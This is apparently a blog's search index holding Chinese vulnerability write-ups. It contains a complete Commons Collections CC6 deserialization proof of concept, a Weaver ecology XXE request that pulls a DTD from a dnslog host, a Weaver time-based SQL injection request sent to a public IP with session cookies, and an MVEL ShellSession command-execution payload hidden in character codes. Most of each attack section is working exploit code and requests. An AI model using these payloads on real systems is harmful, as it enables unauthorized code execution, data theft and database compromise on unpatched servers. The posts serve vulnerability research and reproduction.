                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218493629-bfd47bb2-7c68-4af8-82c5-56c3aa162198.png"
                      class="" title="img"
                > 

<p>这就是我们要加上删除key的操作的原因</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218516554-806c2ac5-1e3c-4aaa-bdea-3f28b0914b25.png"
                      class="" title="img"
                > 

<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Poc &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(hashMap,new ConstantTransformer(&quot;1&quot;));</span><br><span class="line">        //这里传一个没啥用的transformer对象，先put进去再修改，不然put的时候就已经执行命令了</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;2&quot;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; expMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,&quot;3&quot;);</span><br><span class="line">        lazyMap.remove(&quot;2&quot;);</span><br><span class="line">        //******************//删除键值很重要</span><br><span class="line">        Class&lt;?&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        Field factory_ = lazyMapClass.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory_.setAccessible(true);</span><br><span class="line">        factory_.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        System.out.println(lazyMap);</span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>漏洞原理分析</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>泛微deleteRequestInfoByXml接口xml注入漏洞</title>
    <url>/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><strong>&#x2F;rest&#x2F;ofs&#x2F;deleteRequestInfoByXml</strong> </p>
<p><strong>发现泛微很多xxe的地方都会出现xmltomap，这跟到后面会调用SAXReader.read()造成xxe注入漏洞</strong> </p>
<ul>
<li>直接跟现有xmltomap存在漏洞的类，观察哪个函数调用了他，然后再往上找接口</li>
<li>更sink一点，全局搜索SAXReader()实例化的地方，看看是否调用了.read()函数，以及是否有加一些防护手段。</li>
</ul>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="classbean-weaver-rest-servlet-service-ofs-ProcessDoneRequestByXml-java"><a href="#classbean-weaver-rest-servlet-service-ofs-ProcessDoneRequestByXml-java" class="headerlink" title="classbean&#x2F;weaver&#x2F;rest&#x2F;servlet&#x2F;service&#x2F;ofs&#x2F;ProcessDoneRequestByXml.java"></a>classbean&#x2F;weaver&#x2F;rest&#x2F;servlet&#x2F;service&#x2F;ofs&#x2F;ProcessDoneRequestByXml.java</h2><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1740756083401-293a0c52-cec2-46bc-9657-18945fdc2fb3.png"
                      class=""
                > 

<p>该接口调用了</p>
<p>OfsTodoDataManagerNew.processDoneRequestByXml方法</p>
<h2 id="classbean-weaver-ofs-manager-OfsTodoDataManagerNew-java"><a href="#classbean-weaver-ofs-manager-OfsTodoDataManagerNew-java" class="headerlink" title="classbean&#x2F;weaver&#x2F;ofs&#x2F;manager&#x2F;OfsTodoDataManagerNew.java"></a>classbean&#x2F;weaver&#x2F;ofs&#x2F;manager&#x2F;OfsTodoDataManagerNew.java</h2><h3 id="processDoneRequestByXml"><a href="#processDoneRequestByXml" class="headerlink" title="processDoneRequestByXml"></a>processDoneRequestByXml</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1740756128087-a9a9a20c-8ec5-456d-a045-47f49c82a58f.png"
                      class=""
                > 

<p>该方法会将xml格式文件转为map调用xmltomap函数 </p>
<h3 id="xmlToMap"><a href="#xmlToMap" class="headerlink" title="xmlToMap"></a>xmlToMap</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1740756175124-69285341-d1e8-421b-96a5-5e3746ff7923.png"
                      class=""
                > 

<p>该函数会将传入的参数进行parseText解析 </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1740756212187-37077b5f-604d-4413-891c-6407dac5eb91.png"
                      class=""
                > 

<p><strong>重点是SAXReader这个类</strong>，初始化之后read即可造成xml注入漏洞</p>
<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>本地搭建的泛微ecology</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20250312200843035.png"
                      class="" title="image-20250312200843035"
                > 

<p>且是没有登录状态</p>
 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20250312200952922.png"
                      class="" title="image-20250312200952922"
                > 

<p>数据包</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /rest/ofs/deleteRequestInfoByXml HTTP/1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 125</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE syscode SYSTEM &quot;http://xxx.dnslog.cn&quot;&gt;</span><br><span class="line">&lt;M&gt;&lt;syscode&gt;&amp;send;&lt;/syscode&gt;&lt;/M&gt;</span><br></pre></td></tr></table></figure></div>

<p>dnslog结果</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20250312201055988.png"
                      class="" title="image-20250312201055988"
                > 

]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>泛微</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>泛微ReceiveTodoRequestByXml_SQL注入漏洞</title>
    <url>/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="接口跟踪分析"><a href="#接口跟踪分析" class="headerlink" title="接口跟踪分析"></a>接口跟踪分析</h2> 

<p>实例化函数没东西</p>
 

<p>看下面的函数调用</p>
 

<p>现在的步骤是<br>实例化-&gt;processDoneRequestByXml-&gt;processDoneRequestByMap</p>
<p>看processDoneRequestByMap</p>
 

<p>实例化-&gt;processDoneRequestByXml-&gt;processDoneRequestByMap-&gt;receiveRequestInfo</p>
 

<p>看下这个ofsTodoDataManager</p>
 

<p>初始为null，看到设置的地方让他为this，看他的类型是OfsTodoDataManagerNew继承的</p>
<p>如果能让他初始化为自己</p>


<p>调用的就是当前这个类的validate</p>
 

<p>这个service是个数据库函数操作</p>






<p>看到传入的string被处理了一下执行，看下怎么被处理的</p>


<p>直接拼接，所以大概率存在SQL注入</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /rest/ofs/ProcessDoneRequestByXml HTTP/1.1</span><br><span class="line">Host: 110.41.14.179:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://110.41.14.179:81/wui/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: ecology_JSessionid=aaaEApas7tMMlgz3yzdtz; JSESSIONID=aaaEApas7tMMlgz3yzdtz; __randcode__=e1f89faf-ccd6-4d92-aeff-5fb0251b0600</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 53</span><br><span class="line"></span><br><span class="line">&lt;request&gt;</span><br><span class="line">        &lt;syscode&gt;1&#x27;||(SELECT 0x6b4f7252 FROM DUAL WHERE 6182=6182 AND (SELECT 8607 FROM (SELECT(SLEEP(5)))LPaW))||&#x27;&lt;/syscode&gt;</span><br><span class="line">&lt;/request&gt;</span><br></pre></td></tr></table></figure></div>

 

<p>存在mysql数据库的延时注入。sqlserver没打成功</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>泛微</tag>
      </tags>
  </entry>
  <entry>
    <title>MVEL表达式漏洞利用方式</title>
    <url>/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<p>MVEL 是一个表达式语言，一般用于解析和执行基于 Java 基础语言和语法风格的表达式。在动态规则执行和条件匹配方面，MVEL 是一个出色的选择，因为它允许你在运行时定义和修改规则，并立即处理这些规则。</p>
<p><em>由上面这句话可以看出他可以执行基本的Java语句，那就有可能造成命令执行</em> </p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li>maven</li>
</ul>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.mvel&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;mvel2&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;2.4.4.Final&lt;/version&gt; &lt;!-- 你可以根据需要选择其他版本 --&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>

<h2 id="MVEL-eval-expression"><a href="#MVEL-eval-expression" class="headerlink" title="MVEL.eval(expression)"></a>MVEL.eval(expression)</h2> 

<p>成功弹出了计算器，说明我们的java代码被正确的执行了。<br>此时可以得出如果我们在白盒审计中发现MVEL直接调用eval函数，那我们就可以插入恶意的java代码去造成命令执行。</p>
<h2 id="ShellSession"><a href="#ShellSession" class="headerlink" title="ShellSession"></a>ShellSession</h2><p>这是个MVEL表达式里面的一个类，这个类也可以造成命令执行，但是需要对我们传入的字符串进行一定的处理。<br>且他造成命令执行的入口并不是eval函数，而是他有参构造函数的时候一步一步调用到eval。如果实例化的行为可控，那就可以造成漏洞。</p>
<p>恶意代码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.mvel2.sh.ShellSession;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String expression = &quot;push Runtime.getRuntime().exec(String.valueOf((char)111)+String.valueOf((char)112)+String.valueOf((char)101)+String.valueOf((char)110)+String.valueOf((char)32)+String.valueOf((char)45)+String.valueOf((char)97)+String.valueOf((char)32)+String.valueOf((char)67)+String.valueOf((char)97)+String.valueOf((char)108)+String.valueOf((char)99)+String.valueOf((char)117)+String.valueOf((char)108)+String.valueOf((char)97)+String.valueOf((char)116)+String.valueOf((char)111)+String.valueOf((char)114));&quot;;//这个是弹出计算器的命令</span><br><span class="line">        ShellSession shellSession = new ShellSession(expression);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="ShellSession-String-init"><a href="#ShellSession-String-init" class="headerlink" title="ShellSession(String init)"></a>ShellSession(String init)</h4> 

<p>他的有参构造函数调用了exec</p>
<h4 id="exec-String-command"><a href="#exec-String-command" class="headerlink" title="exec(String command)"></a>exec(String command)</h4> 

<p>这里将传入的字符串根据换行符分开，每次循环的时候取出一个，然后我们继续跟进_exec</p>
<h4 id="exec"><a href="#exec" class="headerlink" title="_exec()"></a>_exec()</h4> 

<p>这里会对我们刚才提取的inBuffer参数进行根据空格来分割，例如open -a Calculator 会分成 [‘open’,’-a’,’Calculator’]放入数组intokens里面<br>passParameters &#x3D; new String[inTokens.length - 1]提取了我们分隔出来的数组的最后一个参数，如例子那就是Calculator</p>
 

<p>提取inTokens数组里面第一个作为类，然后去执行execute方法。</p>
<h4 id="pushContext类的利用"><a href="#pushContext类的利用" class="headerlink" title="pushContext类的利用"></a>pushContext类的利用</h4> 

<p>这里面是存在MVEL.eval()的函数调用的，如果args参数可控，我们即可造成漏洞。</p>
 

<p>所以我们要满足三个条件</p>
<ul>
<li>第一个被空格分隔提取的参数要为对应类的key，假如push对应pushContext</li>
<li>inTokens数组的长度要大于1，才会给我们的passParameters参数赋值</li>
<li>this.commands.get(inTokens[0]))看看是否可以让他对应的类为pushContext</li>
</ul>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3> 

<p>跟进去</p>
 

<p>走到有参构造这里，init字符串就是我们的恶意payload</p>
 

<p>这里根据我们的\n符号去分隔我们的字符串，但是我们没有换行，有<strong>空格</strong> ，所以就没有被分隔</p>
 

<p>继续跟进发现我们的字符串被空格分隔了，分成了push和后面的那部份</p>
 

<p>此时如果inTokens里面的第一个参数是push，则可以指向我们的漏洞利用类</p>
<p>因为inTokens&gt;1所以进入给参数赋值</p>
 

<p>走到这里漏洞利用的地方</p>
 

<p>就可以理解为pushContext.execute(this,我们的恶意java代码)</p>
 

<p>最后走向我们的MVEL的eval函数利用点</p>
 

<p>最后弹出了计算器。</p>
<h3 id="paylaod分析"><a href="#paylaod分析" class="headerlink" title="paylaod分析"></a>paylaod分析</h3><ul>
<li>首先我们需要用到类pushContext，又因为他获取这个类是从map里面get(key)提取的，push-&gt;pushContext，所以我们的恶意字符串第一个参数要为push，然后第二个参数是我们的恶意代码，恶意代码跟push会根据空格分开 </li>
<li>然后为什么不直接用open -a Calculator呢，因为这个命令中间也有空格，那参数就会被分开，所以需要转换为ascall码对应的字符串去拼接，就是中间不能出现空格</li>
</ul>
]]></content>
  </entry>
</search>
